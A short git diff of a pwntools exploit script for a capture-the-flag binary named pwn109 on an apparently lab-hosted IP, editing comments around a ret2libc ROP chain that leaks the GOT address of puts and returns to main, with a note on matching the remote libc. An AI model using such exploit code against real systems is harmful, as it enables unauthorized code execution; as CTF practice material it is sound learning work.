@@ -4,8 +4,8 @@
 from pwn import *
 
 elf = context.binary = ELF('./pwn109.pwn109')
-# libc = elf.libc
-libc = ELF('libc6_2.27-3ubuntu1.4_amd64.so')
+# libc = elf.libc # use when local
+libc = ELF('libc6_2.27-3ubuntu1.4_amd64.so') # use for remote - can be found via https://libc.nullbyte.cat/, checking offsets of puts and gets via leak method below
 
 current_thmip = '10.10.190.13'
 
@@ -20,7 +20,7 @@ payload = flat(
     RET, # for stack alignment
     POP_RDI,
     elf.got['puts'], # the address of got puts is the parameter
-    elf.plt['puts'], # call printf via plt
+    elf.plt['puts'], # call puts via plt
     elf.sym['main'], # return address (will be popped into eip when printf returns)
 ) 
 
